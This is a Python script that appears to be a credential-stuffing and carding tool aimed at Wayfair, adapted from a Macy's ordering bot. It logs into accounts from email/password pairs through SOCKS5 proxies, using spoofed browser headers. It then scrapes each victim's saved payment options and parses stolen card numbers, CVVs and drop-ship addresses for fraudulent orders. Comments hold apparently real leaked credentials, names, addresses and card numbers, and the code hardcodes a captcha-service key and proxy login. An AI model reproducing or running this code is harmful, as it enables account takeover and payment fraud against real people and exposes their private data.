#!/usr/bin/python
# -*- coding: utf-8 -*-   
# -*- coding: latin-1 -*-
import re, random;
import sys, time;
import json, base64
from urllib.parse import unquote, quote, urlencode
import mybrowser, munantiapi
import os


class FinalForm:
    """ Final form of registration
    """
    form = "form";
    html = "source code";
    captchaControlName = None;
    questionControlName = None;
    captchaImage = None;
    captchaResult = None;
    keyantigate = None;
    questionString = None;
    questionResult = None;
    listLink = None;

    def __init__(self, form, html):
        self.form = form;
        self.html = html;


class Wayfair:
    """ Test reg forum
    """
    def __init__(self, mun_browser=None, driver=None, orderfinalForm=[], updatestatus='update',captcha_queue=None, mobile=False, antidetectQueQue=None, statusqueue=None):
        self.updatestatus = updatestatus
        self.orderfinalForm = orderfinalForm;

        # ua.set_debug_responses(False)
        self.captcha_queue = captcha_queue;
        self.statusqueue = statusqueue
        self.mun_browser  = mun_browser
        self.driver = driver
        self.browser = mybrowser.Rqbrowser()
        
        self.decaptcha_key = 'aa15c055da98e4867e9c924dce54f1e2'
        self.mun_api = munantiapi.MunAntiApi()
        self.mobile = mobile
        self.phoneApi = None

    def site_login(self,email,password):
        r = self.browser.open('https://www.wayfair.com/v/account/authentication/login?url=https%3A%2F%2Fwww.wayfair.com%2F&context=header_wayfair_my_account_menu')
        html = r.text.replace("'",'"')
        _txid_re = re.search('transactionID":"(.+?)"', html)
        _txid = _txid_re.group(1).strip()
        csrfToken_re = re.search('csrfToken":"(.+?)"', html)
        csrfToken = csrfToken_re.group(1).strip()
        print(csrfToken)
        data = {}
        data['email'] = email
        '6d0bcfc88abb4f4791bcc6a2e12a7d7fa06a065ae590baad168e92f177eaae2a'
        '0B7890AB712E8289B3BE21B67FA89C90'
        request_url = 'https://www.wayfair.com/a/account/authentication/login'
        # action_url = self.browser.getActionUrl(input_form)
        extraHeader = { "accept": "application/json",
    "accept-language": "en-US,en;",
    "content-type": "application/json",
    "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest"}
        
        extraHeader['accept'] = 'application/json'
        extraHeader['content-type'] = 'application/json'
        extraHeader['x-csn-csrf-token'] = csrfToken
        extraHeader['x-parent-txid'] = _txid
        extraHeader['x-auth-caller-context'] = 'header_wayfair_my_account_menu'
        self.browser.add_header('https://www.wayfair.com/v/account/authentication/login?url=https%3A%2F%2Fwww.wayfair.com%2F&context=header_wayfair_my_account_menu', extraHeader=extraHeader, XMLHttpRequest=True)
        self.browser.add_cookies_to_header()
        r = self.browser.open(request_url, json_data=data)
        html = r.json()
        # print(html)
        if 'step' not in html and str(html).find("captcha': 1") != -1:
            raise '==Captcha=='
        if html['step'] == 'password':
            print('==trying login==')
            data = {"_csrf_token":csrfToken,"email":email,"grant_type":"PWD","page":"AUTH","password":password,"recaptchaResponse":'null',"recaptchaSiteKey":'null',"step":"password","userDefaultedToPassword":False}
            extraHeader = { "accept": "application/json",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest"}
            extraHeader['accept'] = 'application/json'
            extraHeader['content-type'] = 'application/json'
            extraHeader['x-csn-csrf-token'] = csrfToken
            extraHeader['x-parent-txid'] = _txid
            extraHeader['x-auth-caller-context'] = 'auth_main_page_context'
            self.browser.add_header('https://www.wayfair.com/v/account/authentication/login?url=https%3A%2F%2Fwww.wayfair.com%2F&context=header_wayfair_my_account_menu', extraHeader=extraHeader, XMLHttpRequest=True)
            self.browser.add_cookies_to_header()
            r = self.browser.open(request_url, json_data=data)
            html = r.json()
            # print(html)
            if html['redirect']:
                return email +'|'+ password
            else:
                return
        else:
            return    


    def change_email_info(self):
        pass


    def update_status(self, status):
        print(status)
        if self.emit:
            try:
                self.emit(self.qtcode.SIGNAL(self.updatestatus + '(QString,QString)'), "updatestatus", str(status))
            except:
                pass


    def get_billing_infomation(self, listbilling):
        hangbill = listbilling.split('|')
        self.bfirstname = hangbill[0].strip()
        self.blastname = hangbill[1].strip()
        self.baddress1 = hangbill[2].strip()
        self.baddress2 = hangbill[3].strip()
        self.bcity = hangbill[4].strip()
        self.bstate = hangbill[5].strip()
        self.bzipcode = hangbill[6].strip()


    #################################
    def get_shipping_infomation(self, shipping_address):
        if shipping_address.find('|') != -1:
            hangdrop = shipping_address.split('|')
            self.sfirstname = hangdrop[0].strip()
            self.slastname = hangdrop[1].strip()
            self.saddress1 = hangdrop[2].strip()
            self.saddress2 = hangdrop[3].strip()
            self.scity = hangdrop[4].strip()
            self.sstate = hangdrop[5].strip().upper()
            self.szipcode = hangdrop[6].strip()
            if self.szipcode.find('-') != -1:
                self.szipcode = self.szipcode.split('-')[0].strip()
            THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
            my_file = os.path.join(THIS_FOLDER, 'us_phone.db')
            sphoneopen = open(my_file)
            listsphone = sphoneopen.read()
            list_phone = listsphone.split('\n')
            min = 0
            max = len(list_phone) - 1
            ran_phone = random.randint(min, max)
            dau = 1000000
            cuoi = 9999999
            phone_them = random.randint(dau, cuoi)
            self.sphone = list_phone[ran_phone].strip().split('|')[0].strip() + str(phone_them)


            self.sphone1 = self.sphone[:3]
            self.sphone2 = self.sphone[3:6]
            self.sphone3 = self.sphone[6:]
            alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
            min = 8
            max = 16
            stringimg = ''
            list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                           'yahoo.com', 'aol.com', 'live.com']
            mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
            for x in random.sample(alphabet, random.randint(min, max)):
                stringimg += x
            username_chuan = stringimg
            # print checkout_form
            self.email_chuan = username_chuan + '@' + mail_domain
            return True

    def get_card_infomation(self, list_card):
        hangcard = list_card.split('|')
        self.ccnum = hangcard[0].strip()
        self.ccmonth = hangcard[1].strip()
        self.ccyear = hangcard[2].strip()
        self.ccv = hangcard[3].strip()

    def check_item_information(self,item_information):
        if item_information.find('|') != -1 and item_information.split('|')[3].isdigit() and len(
                item_information) >= 4:

            return item_information

        elif item_information.find('|') == -1:

            return item_information + '|||1'

    def get_item_information(self, item_information):
        #tem_id_link + '|' + size + '|' + color + '|' + quantity
        self.list_item_link = []
        if item_information.find('http') != -1:
            if item_information.find('&&') != -1 and item_information.find('|') != -1:
                for line_item_information in item_information.split('&&'):
                    # print(line_item_information)
                    item_info = self.check_item_information(line_item_information)
                    if item_info:
                        # print(item_info)
                        self.list_item_link.append(item_info)
            else:
                item_info = self.check_item_information(item_information)
                if item_info:
                    self.list_item_link.append(item_info)
        self.update_status('Total Item:'+str(len(self.list_item_link)))
        return self.list_item_link

    def add_item_to_cart(self, item_link, size, color, quantity):
        pass
    def create_account(self):

        pass

    def go_to_input_shipping(self):
        pass

    def clear_shopping_bag(self):
        pass

    def submit_order(self, macys_card, cardId=''):
        pass

    def check(self, checkInfo, sock5='', proxy=''):
        # self.browser = Rqbrowser()
        check_status = {'suspended':False, 'success': False, 'unknown': False, 'msg':''}
        if sock5:
            self.browser.set_proxies(sock5=sock5)
        if proxy:
            self.browser.set_proxies(proxy=proxy)
        login = self.site_login(checkInfo['email'], checkInfo['password'])
        if login:
            list_info = self.get_account_infomation()
            if list_info:
                check_status['success']  = True
                check_status['msg'] = login + '|'+ str(list_info)
                return check_status
            # else:
            #     return 'check die:no card'
        return check_status

    def check_order_status(self, order_number,email_order, sock5='', sock_type='', username='', password=''):
        pass


    def get_account_infomation(self):
        self.browser.add_header('https://secure.wayfair.com/account/manage-payment-options')
        r = self.browser.open('https://secure.wayfair.com/account/manage-payment-options')
        html = r.text.replace("'",'"')
        c = open('dien.html', 'w', encoding='utf8')
        c.write(html)   
        _txid_re = re.search('_txid", "(.+?)"', html)
        _txid = _txid_re.group(1).strip()
        print(_txid)
        # csrfToken_re = re.search('csrfToken":"(.+?)"', html)
        # csrfToken = csrfToken_re.group(1).strip()
        # print(csrfToken)
        extraHeader = { "accept": "application/json",
            "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6",
            "content-type": "application/json",
            "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin"}
        extraHeader['accept'] = 'application/json'
        extraHeader['content-type'] = 'application/json'
        extraHeader['x-parent-txid'] = _txid
        extraHeader['apollographql-client-name'] = 'my_payment_options_page'
        extraHeader['apollographql-client-version'] = 'monolith'
        extraHeader['use-path'] = 'true'
        self.browser.add_header('https://secure.wayfair.com/account/manage-payment-options', extraHeader=extraHeader)
        # self.browser.add_cookies_to_header()
        r = self.browser.open('https://secure.wayfair.com/graphql?queryPath=payment_service~1%23payment_fragments~0', json_data={"query":"payment_service~1#payment_fragments~0"})
        html = r.json()
        
        try:
            paymentOptions = html['data']['me']['customer']['paymentOptions']
        except Exception as e :
            paymentOptions = html
        print(paymentOptions)    
        return paymentOptions
        # print(paymentOptions)
        # c = open('dien.html', 'w', encoding='utf8')
        # c.write(html)         


    def order(self, shipping_address, card_information=None,account_infomation=None,item_information=None, proxy=None,use_sock5=True):
        """
            item_id = flavors
            color = item
        """
        pass
def main():


    listbilling = 'long|hoang|11407 SW Amu St.Suite #JT907||Tualatin|OR|97062'

    list_address_drop = 'Jiang|Jiang Xiao|11407 SW Amu RD.Suite #UY734||Tualatin|OR|97065'
    #1288375392|FPTgeoEICiYnzs@sbcglobal.net|brynargust@yahoo.com|bryn0320
    ordervr = Wayfair()
    # item_information = 'https://www.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964'
    # ordervr.order(list_address_drop,account_infomation='cwen.hsieh@gmail.com|6474591|CHINGWEN|HSIEH|394 BEVERLY ST|#A|RENO|NV|89512||450399830640|-1|-1',item_information=item_information,proxy='127.0.0.1:9951')
    # ordervr.site_login('kep328@yahoo.com','london98')
    # ordervr.get_info_account_infomation()
    # ordervr.change_email_info()
    checkInfo = {}
    checkInfo['email'] = 'tynasiaxuq@hotmail.com'
    checkInfo['password'] = 'Hahaha123@'
    check = ordervr.check(checkInfo, sock5='meomun2014:Hanoi123@pmsdws2.mountproxies.com:5563')
    if check:
        print(check)
        ordervr.get_account_infomation()
    


    # check_status = ordervr.check_order_status('1347527371','DuVEdmcev@yahoo.com',sock='127.0.0.1:9951')
    # print check_status
    #kristinkbuettner@gmail.com | mdgirly1
    #nancy522@gmail.com|vball522|NANCY|VU|1310 S GLENCOE ST||DENVER|CO|80222|MasterCard1176|5466160368911176|1|2021
    #
    # check = ordervr.check('nancy522@gmail.com','vball522',sock5='127.0.0.1:9951')
    # ordervr.get_macys_card_informaiton()
    # print(check)
    # card_id = ordervr.get_macys_card_info('208172905',get_all=True)
    # print card_id
    # bskvarla@pacbell.net|Hanoi123
    #artglasscreations@sbcglobal.net|dakota|TravisL|buss|2374 Hardscrabble Rd||Drain|OR|97435|Macys4580|438283264580|1|1999
    # status = ordervr.order(list_address_drop, listbilling, list_card='372577389342012|03|2016|5512',
    #                        account_infomation='UhrgfhFNRBgS@aol.com|UhrgfhFNRBgS',
    #                        sock='', flavors='', item_name='',
    #                        item_id_link='http://www1.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964',
    #                        weight='', shipping_info='2 Day', billasship=False)
    # print status
    # ordervr.create_account()
    # ordervr.add_item_to_cart('https://www.macys.com/shop/product/shark-nv358-vacuum-pro-navigator-professional-lift-away?ID=595650','','','1')


if __name__ == "__main__":
    sys.exit(main())
